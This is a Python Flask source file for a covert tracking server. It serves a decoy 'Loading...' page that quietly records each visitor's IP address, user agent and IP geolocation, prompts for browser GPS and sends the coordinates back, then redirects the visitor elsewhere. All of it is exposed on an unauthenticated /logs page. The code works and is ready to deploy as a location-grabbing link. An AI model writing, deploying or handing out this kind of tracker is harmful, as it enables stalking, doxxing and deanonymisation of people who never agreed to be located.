#!/usr/bin/env python3
# tracking_server.py - Captures IP and geolocation directly on page load

from flask import Flask, request, render_template_string
import requests
import json
import datetime
import os

app = Flask(__name__)

LOG_FILE = "tracking_logs.txt"

# Simple HTML that redirects (no extra beacons needed)
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
    <script>
        // Try to get GPS coordinates if user allows
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                function(pos) {
                    var coords = pos.coords.latitude + "," + pos.coords.longitude;
                    fetch('/log_gps?coords=' + coords + '&acc=' + pos.coords.accuracy);
                },
                function(err) {
                    fetch('/log_gps?error=' + err.code);
                }
            );
        } else {
            fetch('/log_gps?error=not_supported');
        }
    </script>
</head>
<body>
    <p>Redirecting...</p>
    <script>window.location.href = "https://example.com";</script>
</body>
</html>
"""

def log_entry(data):
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")

@app.route("/")
def index():
    # Get real IP behind proxies
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if client_ip and ',' in client_ip:
        client_ip = client_ip.split(',')[0].strip()
    user_agent = request.headers.get('User-Agent', 'unknown')

    # Geolocate IP
    geo = {}
    if client_ip and client_ip not in ("127.0.0.1", "::1") and not client_ip.startswith("192.168.") and not client_ip.startswith("10."):
        try:
            resp = requests.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,city,lat,lon,isp,query", timeout=5)
            if resp.status_code == 200:
                geo = resp.json()
        except:
            geo = {"error": "lookup_failed"}

    timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
    data = {
        "timestamp": timestamp,
        "type": "ip_log",
        "ip": client_ip,
        "user_agent": user_agent,
        "geo": geo
    }

    # Print to Render logs and save to file
    print(f"GEO: {geo}")
    log_entry(data)

    return render_template_string(HTML_TEMPLATE, ip=client_ip, ua=user_agent)

@app.route("/log_gps")
def log_gps():
    coords = request.args.get('coords')
    acc = request.args.get('acc')
    error = request.args.get('error')
    timestamp = datetime.datetime.now(datetime.timezone.utc).isoformat()
    data = {
        "timestamp": timestamp,
        "type": "gps",
        "coords": coords,
        "accuracy": acc,
        "error": error
    }
    log_entry(data)
    print(f"GPS: {data}")
    return "OK", 200

@app.route("/logs")
def view_logs():
    if not os.path.exists(LOG_FILE):
        return "No logs yet."
    with open(LOG_FILE, "r") as f:
        lines = f.readlines()
    return "<pre>" + "\n".join(lines) + "</pre>"

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
